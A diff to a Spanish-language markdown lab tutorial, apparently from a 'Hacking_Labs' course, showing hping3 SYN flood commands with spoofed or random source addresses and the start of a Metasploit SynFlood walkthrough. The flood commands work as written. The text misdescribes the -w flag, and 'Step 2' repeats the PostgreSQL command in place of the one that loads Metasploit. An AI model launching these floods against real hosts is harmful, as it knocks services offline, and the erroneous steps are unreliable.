@@ -93,3 +93,40 @@ hping3 -a [ip_atacante_falsa] -p 80  -S --flood [ip_victima] # IP de origen encu
 hping3 --rand-source -p 80  -S --flood [ip_victima] # IP de origen generada aleatoriamente
 ```
 </b>
+
+<b>
+```
+hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.47
+```
+</b>
+Podemos comprobar que las variables <b>-c</b> determina la cantidad de paquetes que se enviarán, que <b>-S</b> activa la flag SYN del paquete TCP-IP, que <b>-p</b> es utilizado para determinar el puerto al que realizar el ataque, <b>-d</b> determina el tamaño de los paquetes que se envían y que <b>-w</b> sirve para mostrar las respuestas Windows.
+
+<p align="center">
+<picture>
+  <source media="(prefers-color-scheme: dark)" srcset="images/TCPSyn_4.png">
+  <source media="(prefers-color-scheme: light)" srcset="images/TCPSyn_4.png">
+  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/TCPSyn_4.png" width="50%">
+</picture>
+</p>
+
+
+
+> ### Trabajando con SYNFlood: METASPLOIT SynFlood :computer:
+> <b>SynFlood</b> es una de las herramientas auxiliares disponibles en el <b>Framework Metasploit</b> donde, de nuevo, la herramienta se aprovecha de un fallo en la forma en que la mayoría de los hosts tienen implementado el handshake TCP de tres vías.
+> Veamos la realización del ataque SYN Flooding:
+
+- <b>Paso 1</b>: En la shell (con privilegios de administrador), arrancamos PostGreSQL:
+<b>
+
+```
+service postgresql start
+```
+</b>
+
+- <b>Paso 2</b>: Posteriormente, cargamos el Framework Metasploit con ayuda del comando:
+<b>
+
+```
+service postgresql start
+```
+</b>
